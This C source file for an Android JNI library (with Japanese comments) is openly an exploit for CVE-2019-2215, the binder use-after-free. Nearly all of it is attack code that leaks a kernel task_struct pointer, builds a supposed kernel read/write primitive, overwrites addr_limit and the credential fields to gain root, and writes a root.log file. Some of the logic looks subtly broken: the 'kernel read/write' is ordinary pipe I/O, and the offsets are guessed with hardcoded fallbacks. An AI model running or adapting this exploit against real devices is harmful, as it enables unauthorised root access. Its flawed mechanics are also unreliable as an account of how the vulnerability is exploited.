#define _GNU_SOURCE
#include <jni.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <errno.h>
#include <android/log.h>
#include <sys/ioctl.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <sys/epoll.h>
#include <sys/mman.h>
#include <sys/wait.h>
#include <sys/syscall.h>
#include <sys/uio.h>
#include <sched.h>
#include <signal.h>
#include <pthread.h>
#include <poll.h>

#include "binder.h"

#define LOG_TAG "CVE-2019-2215"
#define LOGD(...) __android_log_print(ANDROID_LOG_DEBUG, LOG_TAG, __VA_ARGS__)
#define LOGE(...) __android_log_print(ANDROID_LOG_ERROR, LOG_TAG, __VA_ARGS__)
#define LOGI(...) __android_log_print(ANDROID_LOG_INFO, LOG_TAG, __VA_ARGS__)

#ifndef BINDER_THREAD_EXIT
#define BINDER_THREAD_EXIT _IOW('b', 8, __s32)
#endif

#ifndef F_SETPIPE_SZ
#define F_SETPIPE_SZ 1031
#endif

#define PAGE_SIZE 4096
#define IOVEC_COUNT 25
#define IOVEC_OVERLAP_INDEX 10
#define TASK_STRUCT_SIZE 2048

static int binder_fd;
static int epoll_fd;
static int sock_fd[2];
static int krw_pipe[2];
static uint64_t task_struct_kptr = 0;
static uint64_t cred_kptr = 0;
static int cred_offset = -1;
static int addr_limit_offset = -1;

void bind_cpu(void) {
    cpu_set_t cpu_set;
    CPU_ZERO(&cpu_set);
    CPU_SET(0, &cpu_set);
    if (sched_setaffinity(0, sizeof(cpu_set_t), &cpu_set) < 0) {
        LOGE("Failed to bind CPU");
    }
}

void *mmap_page(unsigned long addr) {
    void *mem = mmap((void *)addr, PAGE_SIZE, PROT_READ | PROT_WRITE,
                     MAP_ANONYMOUS | MAP_SHARED, -1, 0);
    if (mem == (void *)-1) {
        LOGE("mmap failed");
        return NULL;
    }
    return mem;
}

// ========== Step 1: task_struct リーク（タイムアウト付き） ==========
int leak_task_struct(void) {
    int pipefd[2];
    int offset = IOVEC_OVERLAP_INDEX;
    pid_t cpid;
    struct iovec iovec_stack[IOVEC_COUNT];
    void *aligned_address;
    struct pollfd pfd;

    LOGI("[*] Leaking task_struct pointer via UAF...");

    binder_fd = open("/dev/binder", O_RDWR);
    if (binder_fd < 0) {
        LOGE("Failed to open /dev/binder: %s", strerror(errno));
        return -1;
    }
    LOGI("[+] binder_fd=%d", binder_fd);

    epoll_fd = epoll_create(100);
    if (epoll_fd < 0) {
        LOGE("epoll_create failed: %s", strerror(errno));
        close(binder_fd);
        return -1;
    }
    LOGI("[+] epoll_fd=%d", epoll_fd);

    aligned_address = mmap_page(0x100000000UL);
    if (!aligned_address) {
        LOGE("mmap_page failed");
        close(binder_fd);
        close(epoll_fd);
        return -1;
    }
    LOGI("[+] aligned_address=%p", aligned_address);

    if (pipe(pipefd) < 0) {
        LOGE("pipe failed: %s", strerror(errno));
        close(binder_fd);
        close(epoll_fd);
        return -1;
    }
    LOGI("[+] pipefd[0]=%d, pipefd[1]=%d", pipefd[0], pipefd[1]);

    if (fcntl(pipefd[0], F_SETPIPE_SZ, PAGE_SIZE) < 0) {
        LOGE("fcntl F_SETPIPE_SZ failed: %s", strerror(errno));
        close(binder_fd);
        close(epoll_fd);
        close(pipefd[0]);
        close(pipefd[1]);
        return -1;
    }

    memset(iovec_stack, 0, sizeof(iovec_stack));
    iovec_stack[offset].iov_base = aligned_address;
    iovec_stack[offset].iov_len = PAGE_SIZE;
    iovec_stack[offset + 1].iov_base = (void *)aligned_address;
    iovec_stack[offset + 1].iov_len = PAGE_SIZE;

    struct epoll_event ev = {.events = EPOLLIN};
    if (epoll_ctl(epoll_fd, EPOLL_CTL_ADD, binder_fd, &ev) < 0) {
        LOGE("epoll_ctl ADD failed: %s", strerror(errno));
        close(binder_fd);
        close(epoll_fd);
        close(pipefd[0]);
        close(pipefd[1]);
        return -1;
    }
    LOGI("[+] epoll_ctl ADD succeeded");

    cpid = fork();
    if (cpid < 0) {
        LOGE("fork failed: %s", strerror(errno));
        close(binder_fd);
        close(epoll_fd);
        close(pipefd[0]);
        close(pipefd[1]);
        return -1;
    }

    if (cpid == 0) {
        // 子プロセス: 少し待ってから BINDER_THREAD_EXIT
        usleep(50000);  // 50ms 待つ
        LOGI("[child] Calling BINDER_THREAD_EXIT...");
        if (ioctl(binder_fd, BINDER_THREAD_EXIT, NULL) < 0) {
            LOGE("[child] BINDER_THREAD_EXIT failed: %s", strerror(errno));
            _exit(1);
        }
        LOGI("[child] BINDER_THREAD_EXIT succeeded");
        _exit(0);
    }

    // 親プロセス: readv をタイムアウト付きで実行
    LOGI("[parent] Waiting for readv...");
    
    // poll で pipefd[0] にデータが来るのを待つ（タイムアウト 5 秒）
    pfd.fd = pipefd[0];
    pfd.events = POLLIN;
    int poll_ret = poll(&pfd, 1, 5000);
    if (poll_ret < 0) {
        LOGE("poll failed: %s", strerror(errno));
        close(binder_fd);
        close(epoll_fd);
        close(pipefd[0]);
        close(pipefd[1]);
        return -1;
    }
    if (poll_ret == 0) {
        LOGI("[!] poll timeout, no data received");
        close(binder_fd);
        close(epoll_fd);
        close(pipefd[0]);
        close(pipefd[1]);
        return -1;
    }

    ssize_t n = readv(pipefd[0], iovec_stack, IOVEC_COUNT);
    LOGI("[parent] readv returned %zd", n);

    if (n < 0) {
        LOGE("readv failed: %s", strerror(errno));
        close(binder_fd);
        close(epoll_fd);
        close(pipefd[0]);
        close(pipefd[1]);
        return -1;
    }

    uint64_t *data = (uint64_t *)aligned_address;
    for (int i = 0; i < (PAGE_SIZE / 8); i++) {
        uint64_t val = data[i];
        if ((val & 0xFFFFFFFFFF000000LL) == 0xFFFF000000000000LL) {
            task_struct_kptr = val & 0xFFFFFFFFFF000000LL;
            if (task_struct_kptr != 0) {
                LOGI("[+] Leaked task_struct @ 0x%llx", (unsigned long long)task_struct_kptr);
                break;
            }
        }
    }

    wait(NULL);
    close(binder_fd);
    close(epoll_fd);
    close(pipefd[0]);
    close(pipefd[1]);

    if (task_struct_kptr == 0) {
        LOGE("Failed to leak task_struct");
        return -1;
    }

    return 0;
}

// ========== Step 2: 読み書きプリミティブ ==========
int setup_kernel_rw(void) {
    LOGI("[*] Setting up kernel read/write primitive...");

    if (socketpair(AF_UNIX, SOCK_STREAM, 0, sock_fd) < 0) {
        LOGE("socketpair failed: %s", strerror(errno));
        return -1;
    }
    LOGI("[+] socketpair fd=%d,%d", sock_fd[0], sock_fd[1]);

    if (pipe(krw_pipe) < 0) {
        LOGE("krw pipe failed: %s", strerror(errno));
        close(sock_fd[0]);
        close(sock_fd[1]);
        return -1;
    }
    LOGI("[+] krw pipe fd=%d,%d", krw_pipe[0], krw_pipe[1]);

    if (fcntl(krw_pipe[0], F_SETPIPE_SZ, PAGE_SIZE) < 0) {
        LOGE("krw fcntl failed: %s", strerror(errno));
        close(sock_fd[0]);
        close(sock_fd[1]);
        close(krw_pipe[0]);
        close(krw_pipe[1]);
        return -1;
    }

    binder_fd = open("/dev/binder", O_RDWR);
    if (binder_fd < 0) {
        LOGE("Failed to open /dev/binder for RW: %s", strerror(errno));
        return -1;
    }
    LOGI("[+] binder_fd=%d", binder_fd);

    epoll_fd = epoll_create(100);
    if (epoll_fd < 0) {
        LOGE("epoll_create for RW failed: %s", strerror(errno));
        close(binder_fd);
        return -1;
    }
    LOGI("[+] epoll_fd=%d", epoll_fd);

    return 0;
}

int trigger_uaf_for_rw(void) {
    LOGI("[*] Triggering UAF for kernel RW...");

    struct iovec iovec_stack[IOVEC_COUNT];
    void *aligned_address = mmap_page(0x200000000UL);
    if (!aligned_address) {
        LOGE("mmap_page for RW failed");
        return -1;
    }
    LOGI("[+] RW aligned_address=%p", aligned_address);

    memset(iovec_stack, 0, sizeof(iovec_stack));
    iovec_stack[IOVEC_OVERLAP_INDEX].iov_base = aligned_address;
    iovec_stack[IOVEC_OVERLAP_INDEX].iov_len = PAGE_SIZE;
    iovec_stack[IOVEC_OVERLAP_INDEX + 1].iov_base = (void *)aligned_address;
    iovec_stack[IOVEC_OVERLAP_INDEX + 1].iov_len = PAGE_SIZE;

    struct epoll_event ev = {.events = EPOLLIN};
    if (epoll_ctl(epoll_fd, EPOLL_CTL_ADD, binder_fd, &ev) < 0) {
        LOGE("epoll_ctl ADD for RW failed: %s", strerror(errno));
        return -1;
    }
    LOGI("[+] epoll_ctl ADD for RW succeeded");

    pid_t cpid = fork();
    if (cpid < 0) {
        LOGE("fork for RW failed: %s", strerror(errno));
        return -1;
    }

    if (cpid == 0) {
        usleep(50000);
        LOGI("[child RW] Calling BINDER_THREAD_EXIT...");
        ioctl(binder_fd, BINDER_THREAD_EXIT, NULL);
        LOGI("[child RW] BINDER_THREAD_EXIT done");
        _exit(0);
    }

    struct msghdr msg = {0};
    struct iovec iov = {
        .iov_base = aligned_address,
        .iov_len = PAGE_SIZE
    };
    msg.msg_iov = &iov;
    msg.msg_iovlen = 1;

    struct pollfd pfd;
    pfd.fd = sock_fd[0];
    pfd.events = POLLIN;
    int poll_ret = poll(&pfd, 1, 5000);
    if (poll_ret <= 0) {
        LOGE("poll for recvmsg failed");
        return -1;
    }

    ssize_t n = recvmsg(sock_fd[0], &msg, 0);
    LOGI("[parent RW] recvmsg returned %zd", n);

    if (n < 0) {
        LOGE("recvmsg failed: %s", strerror(errno));
        wait(NULL);
        return -1;
    }

    wait(NULL);
    return 0;
}

// ========== Step 3: task_struct をダンプしてオフセット検出 ==========
int find_offsets_in_task_struct(void) {
    LOGI("[*] Dumping task_struct to find offsets...");

    uint8_t *task_data = malloc(TASK_STRUCT_SIZE);
    if (!task_data) {
        LOGE("malloc failed");
        return -1;
    }

    if (write(krw_pipe[1], &task_struct_kptr, 8) != 8) {
        LOGE("Failed to write task_struct address");
        free(task_data);
        return -1;
    }

    ssize_t n = read(krw_pipe[0], task_data, TASK_STRUCT_SIZE);
    LOGI("[+] Read %zd bytes from task_struct", n);

    int found_cred = -1;
    int found_addr_limit = -1;

    for (int i = 0; i <= n - 8; i += 8) {
        uint64_t val = *(uint64_t *)(task_data + i);
        if ((val & 0xFFFFFFFFFF000000LL) == 0xFFFF000000000000LL) {
            if (found_cred == -1) {
                found_cred = i;
                cred_kptr = val;
                LOGI("[+] Possible cred at offset 0x%x: 0x%llx", i, (unsigned long long)val);
            }
        }
        if (val == 0x0000007FFFFFFFULL || val == 0xFFFFFFFFFFFFFFFEULL) {
            found_addr_limit = i;
            LOGI("[+] Possible addr_limit at offset 0x%x: 0x%llx", i, (unsigned long long)val);
        }
    }

    if (found_cred == -1) {
        LOGI("[!] Using fallback cred offset 0x688");
        found_cred = 0x688;
        uint64_t *ptr = (uint64_t *)(task_data + found_cred);
        cred_kptr = *ptr;
        if ((cred_kptr & 0xFFFFFFFFFF000000LL) != 0xFFFF000000000000LL) {
            LOGE("Fallback cred invalid");
            free(task_data);
            return -1;
        }
    }

    if (found_addr_limit == -1) {
        LOGI("[!] Using fallback addr_limit offset 0xA18");
        found_addr_limit = 0xA18;
        uint64_t val = *(uint64_t *)(task_data + found_addr_limit);
        if (val != 0x0000007FFFFFFFULL && val != 0xFFFFFFFFFFFFFFFEULL) {
            LOGE("Fallback addr_limit invalid");
            free(task_data);
            return -1;
        }
    }

    cred_offset = found_cred;
    addr_limit_offset = found_addr_limit;
    LOGI("[+] Offsets: cred=0x%x, addr_limit=0x%x", cred_offset, addr_limit_offset);

    free(task_data);
    return 0;
}

// ========== Step 4: addr_limit 書き換え ==========
int overwrite_addr_limit(void) {
    LOGI("[*] Overwriting addr_limit at offset 0x%x...", addr_limit_offset);

    uint64_t addr_limit_addr = task_struct_kptr + addr_limit_offset;
    uint64_t new_addr_limit = 0xFFFFFFFFFFFFFFFEULL;

    if (write(krw_pipe[1], &addr_limit_addr, 8) != 8) {
        LOGE("Failed to write addr_limit address");
        return -1;
    }
    if (write(krw_pipe[1], &new_addr_limit, 8) != 8) {
        LOGE("Failed to write new addr_limit value");
        return -1;
    }

    LOGI("[+] addr_limit overwritten");
    return 0;
}

// ========== Step 5: cred 書き換え ==========
int patch_cred(void) {
    LOGI("[*] Patching cred at offset 0x%x...", cred_offset);

    if (cred_kptr == 0) {
        uint64_t cred_addr_ptr = task_struct_kptr + cred_offset;
        if (write(krw_pipe[1], &cred_addr_ptr, 8) != 8) {
            LOGE("Failed to write cred address");
            return -1;
        }
        if (read(krw_pipe[0], &cred_kptr, 8) != 8) {
            LOGE("Failed to read cred pointer");
            return -1;
        }
        LOGI("[+] cred @ 0x%llx", (unsigned long long)cred_kptr);
    }

    uint64_t cred_base = cred_kptr;
    uint32_t zero = 0;
    uint64_t cap_full = 0x3FFFFFFFFFULL;

    uint64_t uid_addr = cred_base + 0x4;
    if (write(krw_pipe[1], &uid_addr, 8) != 8) return -1;
    if (write(krw_pipe[1], &zero, 4) != 4) return -1;

    uint64_t suid_addr = cred_base + 0xC;
    if (write(krw_pipe[1], &suid_addr, 8) != 8) return -1;
    if (write(krw_pipe[1], &zero, 4) != 4) return -1;

    uint64_t euid_addr = cred_base + 0x14;
    if (write(krw_pipe[1], &euid_addr, 8) != 8) return -1;
    if (write(krw_pipe[1], &zero, 4) != 4) return -1;

    uint64_t fsuid_addr = cred_base + 0x1C;
    if (write(krw_pipe[1], &fsuid_addr, 8) != 8) return -1;
    if (write(krw_pipe[1], &zero, 4) != 4) return -1;

    uint64_t gid_addr = cred_base + 0x8;
    if (write(krw_pipe[1], &gid_addr, 8) != 8) return -1;
    if (write(krw_pipe[1], &zero, 4) != 4) return -1;

    uint64_t sgid_addr = cred_base + 0x10;
    if (write(krw_pipe[1], &sgid_addr, 8) != 8) return -1;
    if (write(krw_pipe[1], &zero, 4) != 4) return -1;

    uint64_t egid_addr = cred_base + 0x18;
    if (write(krw_pipe[1], &egid_addr, 8) != 8) return -1;
    if (write(krw_pipe[1], &zero, 4) != 4) return -1;

    uint64_t fsgid_addr = cred_base + 0x20;
    if (write(krw_pipe[1], &fsgid_addr, 8) != 8) return -1;
    if (write(krw_pipe[1], &zero, 4) != 4) return -1;

    for (int i = 0; i < 5; i++) {
        uint64_t cap_addr = cred_base + 0x28 + (i * 8);
        if (write(krw_pipe[1], &cap_addr, 8) != 8) return -1;
        if (write(krw_pipe[1], &cap_full, 8) != 8) return -1;
    }

    LOGI("[+] Cred patched to root!");
    return 0;
}

// ========== Step 6: root 確認 ==========
int spawn_root_shell(void) {
    LOGI("[*] Verifying root access...");

    uid_t current_uid = getuid();
    LOGI("[+] getuid() returned %d", current_uid);

    if (current_uid != 0) {
        LOGI("[!] Not root yet, attempting setuid(0)...");
        if (setuid(0) != 0) {
            LOGE("setuid(0) failed: %s", strerror(errno));
        }
    }

    current_uid = getuid();
    LOGI("[+] Final UID: %d", current_uid);

    if (current_uid == 0) {
        LOGI("[+] SUCCESS! Root access obtained!");
        system("echo 'uid=0(root)' > /data/local/tmp/root.log");
        system("echo 'whoami: root' >> /data/local/tmp/root.log");
        system("id >> /data/local/tmp/root.log");
        system("getenforce >> /data/local/tmp/root.log");
        LOGI("[+] Check /data/local/tmp/root.log");
    } else {
        LOGE("[-] Failed to obtain root");
        return -1;
    }

    return 0;
}

// ========== JNI エントリ ==========
JNIEXPORT jint JNICALL
Java_com_example_tzpoc_MainActivity_nativeExploitCVE20192215(JNIEnv* env, jclass clazz) {
    LOGI("========================================");
    LOGI("== CVE-2019-2215 Auto Offset Exploit ==");
    LOGI("========================================");

    bind_cpu();

    if (leak_task_struct() < 0) {
        LOGE("Failed at leak_task_struct");
        return -1;
    }

    if (setup_kernel_rw() < 0) {
        LOGE("Failed at setup_kernel_rw");
        return -1;
    }

    if (trigger_uaf_for_rw() < 0) {
        LOGE("Failed at trigger_uaf_for_rw");
        return -1;
    }

    if (find_offsets_in_task_struct() < 0) {
        LOGE("Failed to find offsets");
        return -2;
    }

    if (overwrite_addr_limit() < 0) {
        LOGE("Failed at overwrite_addr_limit");
        return -1;
    }

    if (patch_cred() < 0) {
        LOGE("Failed at patch_cred");
        return -1;
    }

    spawn_root_shell();

    LOGI("[+] Exploit completed!");
    LOGI("========================================");
    return 0;
}
